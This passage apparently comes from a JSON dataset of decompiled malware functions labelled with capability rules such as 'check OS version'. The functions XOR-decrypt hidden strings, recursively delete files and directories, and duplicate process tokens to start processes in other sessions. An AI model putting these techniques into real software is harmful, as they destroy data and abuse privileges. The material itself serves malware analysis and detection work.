uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uchar var_2ch;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_15h;\n    uint var_11h;\n    uint var_dh;\n    uint32_t var_9h;\n    int32_t dwBytes;\n    \n    pcVar3 = _sym.imp.USERENV.dll_GetProfilesDirectoryW;\n    var_c8h = 0;\n    ARG_0 = NULL;\n    dwBytes = 0;\n    (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(0, &dwBytes);\n    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (dwBytes != 0) {\n        dwBytes = dwBytes + 10;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes * 2);\n        piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        var_64h = piVar5;\n        uVar4 = (*pcVar14)(8, dwBytes * 2);\n        lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        if (piVar5 != NULL) {\n            uVar4 = (*pcVar14)(8, 0x208);\n            puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            puVar10 = &lpFindFileData;\n            ARG_0 = puVar6;\n            for (iVar7 = 0x250; piVar5 = var_64h,  iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            puVar6 = lpFileName;\n            for (iVar7 = dwBytes * 2; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            piVar16 = var_64h;\n            for (iVar7 = dwBytes * 2; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *piVar16 = 0;\n                piVar16 = piVar16 + 1;\n            }\n            iVar7 = (*pcVar3)(var_64h, &dwBytes);\n            if (iVar7 != 0) {\n                iVar7 = lpFileName - piVar5;\n                do {\n                    iVar2 = *piVar5;\n                    *(piVar5 + iVar7) = iVar2;\n                    piVar5 = piVar5 + 1;\n                } while (iVar2 != 0);\n                var_5ch = 0x4f675019;\n                var_58h = 0x4d7a4557;\n                var_54h._0_2_ = 0x794f;\n                var_44h = 0x4f4d5045;\n                var_40h._0_1_ = 0x79;\n                uVar4 = (*pcVar14)(8, 0x15);\n                lpMem = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                var_48h = 5;\n                iVar7 = 0;\n                do {\n                    puVar1 = iVar7 + lpMem;\n                    iVar9 = iVar7 % 5;\n                    iVar7 = iVar7 + 1;\n                    *puVar1 = *(&var_44h + iVar9) ^ puVar1[&var_5ch - lpMem];\n                    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    puVar10 = lpMem;\n                } while (iVar7 < 10);\n                do {\n                    iVar2 = *puVar10;\n                    puVar10 = puVar10 + 2;\n                } while (iVar2 != 0);\n                uVar11 = puVar10 - lpMem;\n                puVar10 = lpFileName + -2;\n                do {\n                    piVar5 = puVar10 + 2;\n                    puVar10 = puVar10 + 2;\n                } while (*piVar5 != 0);\n                puVar15 = lpMem;\n                for (uVar8 = uVar11 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {\n                    *puVar10 = *puVar15;\n                    puVar15 = puVar15 + 1;\n                    puVar10 = puVar10 + 1;\n                }\n                for (uVar11 = uVar11 & 3; uVar11 != 0; uVar11 = uVar11 - 1) {\n                    *puVar10 = *puVar15;\n                    puVar15 = puVar15 + 1;\n                    puVar10 = puVar10 + 1;\n                }\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n                if (hFindFile != -1) {\n                    var_60h = 0x354b6343;\n                    var_70h = 0x354b636d;\n                    var_6ch._0_1_ = 0x6d;\n                    var_90h = 0x7a7f747e;\n                    var_8ch._0_2_ = 0x507a;\n                    var_78h = 0x7a517450;\n                    var_74h._0_1_ = 0x7a;\n                    var_cch = 6;\n                    do {\n                        uVar4 = (*pcVar14)(8, 9);\n                        pcVar14 = _sym.imp.KERNEL32.dll_HeapAlloc;\n                        lpString2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                        iVar7 = 0;\n                        var_3ch = &var_60h - lpString2;\n                        do {\n                            puVar1 = iVar7 + lpString2;\n                            iVar9 = iVar7 % var_48h;\n                            iVar7 = iVar7 + 1;\n                            *puVar1 = *(&var_70h + iVar9) ^ puVar1[&var_60h - lpString2];\n                        } while (iVar7 < 4);\n                        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n                        iVar9 = (*pcVar14)(uVar4);\n                        iVar7 = lpString2;\n                        iVar13 = 0;\n                        var_44h = iVar9;\n                        var_3ch = &var_90h - iVar9;\n                        do {\n                            puVar1 = iVar13 + iVar9;\n                            iVar12 = iVar13 % var_48h;\n                            iVar13 = iVar13 + 1;\n                            *puVar1 = *(&var_78h + iVar12) ^ puVar1[&var_90h - iVar9];\n                        } while (iVar13 < 6);\n                        iVar13 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, lpString2);\n                        pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (((iVar13 != 0) &&\n                            (iVar13 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, iVar9),  iVar13 != 0)) &&\n                           ((lpFindFileData & 0x10) != 0)) {\n                            var_30h = 0x612d7306;\n                            _var_2ch = 0x732b4508;\n                            stack0xffffffd4 = 0x454b612e;\n                            var_27h._3_1_ = 0x19;\n                            var_23h._0_1_ = 0x73;\n                            var_23h._1_1_ = 0x27;\n                            var_23h._2_2_ = 0x1f61;\n                            var_1fh._0_2_ = 0x3e45;\n                            var_1fh._2_2_ = 0x2b73;\n                            var_1bh._0_1_ = 0x61;\n                            var_1bh._1_1_ = 5;\n                            stack0xffffffe3 = 0x31732d45;\n                            var_15h = 0x1e453761;\n                            var_11h = 0x6612773;\n                            var_dh = 0x42733a45;\n                            var_9h._0_1_ = 0x61;\n                            var_98h = 0x6142734a;\n                            var_94h._0_2_ = 0x456b;\n                            uVar4 = (*pcVar14)(8, 0x51);\n                            pcVar14 = _sym.imp.KERNEL32.dll_HeapAlloc;\n                            var_3ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                            iVar7 = 0;\n                            stack0xfffffff4 = &var_30h - var_3ch;\n                            do {\n                                puVar1 = iVar7 + var_3ch;\n                                iVar9 = iVar7 % var_cch;\n                                iVar7 = iVar7 + 1;\n                                *puVar1 = *(&var_98h + iVar9) ^ puVar1[&var_30h - var_3ch];\n                            } while (iVar7 < 0x28);\n                            var_c0h = 0x63346c37;\n                            var_bch = 0x4428763c;\n                            var_b8h = 0x6c024c02;\n                            var_b4h = 0x76106325;\n                            var_b0h = 0x4c0c4420;\n                            var_ach = 0x63256c15;\n                            var_a8h = 0x44307620;\n                            var_a4h = 0x6c134c37;\n                            var_a0h = 0x763c6329;\n                            var_9ch._0_2_ = 0x446c;\n                            var_80h = 0x63446c76;\n                            var_7ch._0_1_ = 0x4c;\n                            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n                            var_d4h = (*pcVar14)(uVar4);\n                            iVar7 = 0;\n                            stack0xfffffff4 = &var_c0h - var_d4h;\n                            do {\n                                puVar1 = iVar7 + var_d4h;\n                                iVar9 = iVar7 % var_48h;\n                                iVar7 = iVar7 + 1;\n                                *puVar1 = *(&var_80h + iVar9) ^ puVar1[&var_c0h - var_d4h];\n                            } while (iVar7 < 0x26);\n                            var_58h = var_3ch;\n                            stack0xfffffff4 = 0;\n                            var_88h = 0x486f4b31;\n                            var_84h._0_1_ = 0x55;\n                            pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                            var_5ch = var_d4h;\n                            do {\n                                var_38h = 0x481c4b14;\n                                var_34h = 0x6f6e3109;\n                                var_30h = 0x4b6d553b;\n                                _var_2ch = 0x3126484a;\n                                stack0xffffffd4 = 0x553d6f17;\n                                var_27h._3_1_ = 0x40;\n                                var_23h._0_1_ = 0x4b;\n                                var_23h._1_1_ = 5;\n                                var_23h._2_2_ = 0x3648;\n                                var_1fh._0_2_ = 0x2031;\n                                var_1fh._2_2_ = 0x2d6f;\n                                var_1bh._0_1_ = 0x55;\n                                var_1bh._1_1_ = 0x56;\n                                stack0xffffffe3 = 0x3d481a4b;\n                                var_15h = 0x666f2731;\n                                var_11h = 0x24b4555;\n                                var_dh = 0x4b312548;\n                                var_9h._0_1_ = 0x6f;\n                                uVar4 = (*pcVar14)(8, 0x61);\n                                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                                iVar9 = 0;\n                                var_d0h = &var_38h - iVar7;\n                                do {\n                                    puVar1 = iVar9 + iVar7;\n                                    iVar13 = iVar9 % var_48h;\n                                    iVar9 = iVar9 + 1;\n                                    *puVar1 = *(&var_88h + iVar13) ^ puVar1[var_d0h];\n                                } while (iVar9 < 0x30);\n                                (*_sym.imp.USER32.dll_wsprintfW)\n                                          (ARG_0, iVar7, var_64h, &lpString1, (&var_5ch)[stack0xfffffff4]);\n                                iVar9 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(ARG_0);\n                                pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                if (iVar9 != -1) {\n                                    fcn.004058c9();\n                                    var_c8h = 1;\n                                }\n                                uVar4 = (*pcVar14)(0, iVar7);\n                                pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                                *NULL = stack0xfffffff4 + 1;\n                            } while (*NULL < 2);\n                            uVar4 = (*pcVar14)(0, var_d4h);\n                            (*pcVar3)(uVar4);\n                            uVar4 = (*pcVar14)(0, var_3ch);\n                            (*pcVar3)(uVar4);\n                            iVar9 = var_44h;\n                            iVar7 = lpString2;\n                        }\n                        uVar4 = (*pcVar14)(0, iVar9);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                        uVar4 = (*pcVar14)(0, iVar7);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                        iVar7 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                    } while (iVar7 != 0);\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                uVar4 = (*pcVar14)(0, lpMem);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                piVar5 = var_64h;\n            }\n        }\n        if (lpFileName != NULL) {\n            uVar4 = (*pcVar14)(0, lpFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        if (piVar5 != NULL) {\n            uVar4 = (*pcVar14)(0, piVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        if (ARG_0 != NULL) {\n            uVar4 = (*pcVar14)(0, ARG_0);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    return var_c8h;\n}\n",
        "token_count": 3977
    },
    "00404ec1": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00404ec1(int32_t *param_1, int32_t *param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    code *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *hHeap;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    iVar8 = -0x3fffffdd;\n    if ((((param_1 != NULL) && (param_2 != NULL)) && (*param_1 != 0)) && (hHeap = param_1[1],  hHeap != NULL)) {\n        if (*param_1 == *hHeap) {\n            var_38h = 0x36201e1a;\n            var_34h = 0x727131c;\n            var_30h._0_1_ = 0x3c;\n            var_30h._1_1_ = 0;\n            var_30h._2_2_ = 0x31c;\n            var_2ch._0_2_ = 0x283b;\n            var_2ch._2_2_ = 0x1439;\n            var_28h._0_2_ = 0x151f;\n            var_28h._2_2_ = 0x6a3a;\n            var_24h = 0x724c6a48;\n            var_20h._0_2_ = 0x7079;\n            var_1ch = param_2;\n            var_18h = param_1;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            var_8h = 6;\n            iVar8 = 0;\n            var_10h = &var_38h - var_14h;\n            do {\n                puVar1 = iVar8 + var_14h;\n                iVar6 = iVar8 % 6;\n                iVar8 = iVar8 + 1;\n                *puVar1 = *(&var_24h + iVar6) ^ puVar1[&var_38h - var_14h];\n            } while (iVar8 < 0x14);\n            var_30h._0_1_ = 0x5d;\n            var_30h._1_1_ = 6;\n            var_30h._2_2_ = 0x141c;\n            var_2ch._0_2_ = 0x1d5b;\n            var_2ch._2_2_ = 0x1416;\n            var_28h._0_2_ = 0x3714;\n            var_24h = 0x78787233;\n            var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x37);\n            uVar4 = (*pcVar2)(8, 0xb);\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = var_14h;\n            iVar8 = 0;\n            var_8h = &var_30h - iVar5;\n            do {\n                var_10h = 5;\n                puVar1 = iVar8 + iVar5;\n                iVar7 = iVar8 % 5;\n                iVar8 = iVar8 + 1;\n                *puVar1 = *(&var_24h + iVar7) ^ puVar1[&var_30h - iVar5];\n            } while (iVar8 < 10);\n            uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar5, var_14h);\n            var_14h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n            uVar4 = (*pcVar2)(8, hHeap[1]);\n            var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar8 = *hHeap;\n            var_18h = var_18h[1] + 0xc;\n            fcn.00404e2f();\n            piVar3 = hHeap;\n            iVar8 = (*var_14h)(2, var_8h, hHeap[1], var_18h, iVar8 + -0xc, &var_ch);\n            hHeap = iVar8;\n            if (iVar8 == 0) {\n                if (var_ch == piVar3[1]) {\n                    var_1ch[1] = var_8h;\n                    *var_1ch = var_ch;\n                }\n                else {\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    iVar8 = -0x3fffff85;\n                }\n            }\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            (*pcVar2)(uVar4);\n        }\n        else {\n            iVar8 = -0x3fffff85;\n        }\n    }\n    return iVar8;\n}\n",
        "token_count": 1346
    },
    "00405473": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00405473(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    code *pcVar9;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t hFindFile;\n    uint var_28h;\n    int16_t *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t lpString2;\n    int32_t var_ch;\n    uint8_t *lpFindFileData;\n    int32_t lpFileName;\n    \n    var_ch = 8;\n    var_20h = 0x104;\n    var_30h = fcn.00405c06();\n    lpString2 = in_ECX;\n    if (var_30h != 0) {\n        lpString2 = var_30h;\n    }\n    var_18h = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n    lpFileName = iVar4;\n    if (iVar4 != 0) {\n        uVar3 = (*pcVar8)(8, var_18h * 2 + 0xc);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (var_14h != 0) {\n            uVar3 = (*pcVar8)(8, 0x250);\n            lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            if (lpFindFileData != NULL) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar4, lpString2);\n                var_ch = 0x37766929;\n                hFindFile = 0x37766975;\n                var_28h._0_2_ = 0x5636;\n                uVar3 = (*pcVar8)(8, 9);\n                var_1ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar4 = 0;\n                do {\n                    var_24h = 0x6;\n                    puVar1 = iVar4 + var_1ch;\n                    iVar5 = iVar4 % 6;\n                    iVar4 = iVar4 + 1;\n                    *puVar1 = *(&hFindFile + iVar5) ^ puVar1[&var_ch - var_1ch];\n                } while (iVar4 < 4);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, var_1ch);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(var_14h, lpString2);\n                var_3ch = 0x4f675019;\n                var_38h = 0x4d7a4557;\n                var_34h._0_2_ = 0x794f;\n                hFindFile = 0x4f4d5045;\n                var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x79);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar4 = var_14h;\n                iVar7 = 0;\n                do {\n                    var_24h = 0x5;\n                    puVar1 = iVar7 + iVar5;\n                    iVar6 = iVar7 % 5;\n                    iVar7 = iVar7 + 1;\n                    *puVar1 = *(&hFindFile + iVar6) ^ puVar1[&var_3ch - iVar5];\n                } while (iVar7 < 10);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(var_14h, iVar5);\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar4, lpFindFileData);\n                uVar2 = var_1ch;\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (hFindFile == -1) {\n                    var_ch = 3;\n                }\n                else {\n                    var_ch = 0;\n                    var_24h = lpFindFileData + 0x2c;\n                    do {\n                        if (*var_24h != 0x2e) {\n                            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_24h);\n                            var_1ch = iVar4 + 2 + var_18h;\n                            if (var_20h < var_1ch) {\n                                uVar3 = (*pcVar8)(0, lpFileName);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                                uVar3 = (*pcVar8)(8, var_1ch * 2);\n                                lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                                if (lpFileName == 0) {\n                                    var_ch = 8;\n                                    break;\n                                }\n                                var_20h = var_1ch;\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, uVar2);\n                            }\n                            else {\n                                *(lpFileName + 2 + var_18h * 2) = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, var_24h);\n                            if ((*lpFindFileData & 0x10) == 0) {\n                                iVar4 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n                            }\n                            else {\n                                var_ch = fcn.00405473(arg_8h);\n                                if (var_ch != 0) break;\n                                iVar4 = (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)(lpFileName);\n                            }\n                            if ((iVar4 == 0) && (arg_8h == 0)) {\n                                var_ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                break;\n                            }\n                        }\n                        iVar4 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, lpFindFileData);\n                    } while (iVar4 != 0);\n                }\n                uVar3 = (*pcVar8)(0, iVar5);\n                pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar3 = (*pcVar8)(0, uVar2);\n                (*pcVar9)(uVar3);\n                uVar3 = (*pcVar8)(0, lpFindFileData);\n                (*pcVar9)(uVar3);\n                iVar4 = lpFileName;\n            }\n            uVar3 = (*pcVar8)(0, var_14h);\n            (*pcVar9)(uVar3);\n        }\n        if (iVar4 != 0) {\n            uVar3 = (*pcVar8)(0, iVar4);\n            (*pcVar9)(uVar3);\n        }\n    }\n    if (var_30h != 0) {\n        uVar3 = (*pcVar8)(0, var_30h);\n        (*pcVar9)(uVar3);\n    }\n    return var_ch;\n}\n",
        "token_count": 1763
    },
    "00406f18": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00406f18(int32_t param_1, int32_t *param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    uint *puVar9;\n    uint var_e0h;\n    int32_t var_d8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    uint TokenHandle;\n    uint pSessionId;\n    int32_t ProcessHandle;\n    uint hExistingToken;\n    int32_t var_78h;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t *var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t lpApplicationName;\n    uint hObject;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_60h = 4;\n    var_6ch._0_2_ = 0x1000;\n    piVar8 = param_2;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *piVar8 = 0;\n        piVar8 = piVar8 + 1;\n    }\n    puVar9 = &var_e0h;\n    var_5ch = param_2;\n    lpApplicationName = param_1;\n    for (iVar4 = 0x44; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    pSessionId = 0;\n    puVar9 = &var_98h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hObject = 0;\n    hExistingToken = 0;\n    var_58h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    var_18h = 0xb452c32;\n    var_14h = 0x7b6a1413;\n    var_10h._0_2_ = 0x119;\n    var_10h._2_2_ = 0x141a;\n    var_ch._0_1_ = 0x59;\n    var_40h = 0x65374959;\n    var_3ch._0_2_ = 0x7876;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_48h = 6;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + iVar4;\n        iVar5 = iVar7 % 6;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_40h + iVar5) ^ puVar1[&var_18h - iVar4];\n    } while (iVar7 < 0xd);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_8ch = iVar4;\n    if (ProcessHandle != 0) {\n        var_18h = 0xb452c32;\n        var_14h = 0x7b6a1413;\n        var_10h._0_2_ = 0x119;\n        var_10h._2_2_ = 0x141a;\n        var_ch._0_1_ = 0x59;\n        var_40h = 0x65374959;\n        var_3ch._0_2_ = 0x7876;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar4 = 0;\n        do {\n            puVar1 = iVar4 + iVar7;\n            iVar5 = iVar4 % var_48h;\n            iVar4 = iVar4 + 1;\n            *puVar1 = *(&var_40h + iVar5) ^ puVar1[&var_18h - iVar7];\n        } while (iVar4 < 0xd);\n        var_68h = iVar7;\n        iVar4 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(lpApplicationName, &pSessionId);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iVar4 != 0) {\n            var_34h = 0x3b291601;\n            var_30h._0_2_ = 0x3d24;\n            var_30h._2_1_ = 0x1b;\n            var_30h._3_1_ = 0x2b;\n            var_2ch._0_2_ = 0x3237;\n            var_2ch._2_1_ = 0x3b;\n            stack0xffffffd3 = 0x2f071507;\n            var_28h._3_1_ = 0x29;\n            var_24h._0_1_ = 0xd;\n            var_24h._1_1_ = 10;\n            var_24h._2_1_ = 0x23;\n            stack0xffffffdb = 0x170b3b20;\n            var_20h._3_1_ = 0x20;\n            var_1ch._0_1_ = 0x41;\n            var_8h = 0x4e78624f;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x41);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            var_78h = 5;\n            var_40h = iVar4;\n            iVar7 = 0;\n            do {\n                puVar1 = iVar7 + iVar4;\n                iVar5 = iVar7 % 5;\n                iVar7 = iVar7 + 1;\n                *puVar1 = *(&var_8h + iVar5) ^ puVar1[&var_34h - iVar4];\n            } while (iVar7 < 0x19);\n            iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x201eb, &hExistingToken);\n            iVar7 = var_68h;\n            pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar5 != 0) {\n                fcn.0040754b();\n                iVar5 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hObject);\n                pcVar2 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar5 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hObject, 0xc, pSessionId, 4);\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar4 != 0) {\n                        var_94h = 0x20;\n                        var_98h = pSid;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar2)(hObject, 0x19, &var_98h, iVar4 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_90h = 0;\n                    (*pcVar2)(hObject, 0x1b, &var_90h, 4);\n                    iVar4 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_58h, hObject, 1);\n                    if (iVar4 == 0) {\n                        var_58h = 0;\n                    }\n                    else {\n                        var_60h = 0x404;\n                    }\n                    var_e0h = 0x44;\n                    var_38h = 0x610c361e;\n                    var_34h = 0x361a310a;\n                    var_30h._0_2_ = 0x6111;\n                    var_30h._2_1_ = 5;\n                    var_30h._3_1_ = 0x31;\n                    var_2ch._0_2_ = 0x3659;\n                    var_2ch._2_1_ = 0x39;\n                    stack0xffffffd3 = 0xc310061;\n                    var_28h._3_1_ = 0x36;\n                    var_24h._0_1_ = 3;\n                    var_24h._1_1_ = 0x61;\n                    stack0xffffffdb = 0x9361c31;\n                    var_20h._3_1_ = 0x61;\n                    var_1ch._0_1_ = 0x10;\n                    var_1ch._1_1_ = 0x31;\n                    var_1ch._2_1_ = 0x69;\n                    var_1ch._3_1_ = 0x36;\n                    var_8h = 0x61653669;\n                    var_4h._0_2_ = 0x3164;\n                    var_24h._2_1_ = var_30h._2_1_;\n                    uVar3 = (*pcVar6)(8, 0x41);\n                    var_54h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar4 = 0;\n                    lpApplicationName = &var_38h - var_54h;\n                    do {\n                        puVar1 = iVar4 + var_54h;\n                        iVar7 = iVar4 % var_48h;\n                        iVar4 = iVar4 + 1;\n                        *puVar1 = *(&var_8h + iVar7) ^ puVar1[lpApplicationName];\n                    } while (iVar4 < 0x20);\n                    var_30h._0_2_ = 0x6e43;\n                    var_30h._2_1_ = 0x1e;\n                    var_30h._3_1_ = 0x7a;\n                    var_2ch._0_2_ = 0x3015;\n                    